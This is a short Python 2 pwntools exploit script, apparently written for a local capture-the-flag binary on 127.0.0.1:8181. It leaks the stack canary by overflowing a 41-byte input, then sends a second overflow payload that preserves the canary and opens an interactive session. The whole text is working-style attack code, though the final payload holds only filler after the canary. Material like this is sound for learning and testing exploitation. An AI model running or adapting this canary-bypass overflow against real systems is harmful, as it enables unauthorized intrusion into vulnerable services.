from pwn import *
r = remote("127.0.0.1", 8181)

# Step 1. Leak Canary
print r.recvuntil("Select menu > ")
r.sendline("1")
print r.recv()
payload = "a"*41
r.send(payload)
leak = r.recv()
canary = u32("\x00" + leak[-3:])
print "[*] Canary : ", hex(canary)

# Step 2. Exploit
r.sendline("1")
print r.recv()
payload = "b"*40 + p32(canary) + "b"*20 

r.send(payload)
r.interactive()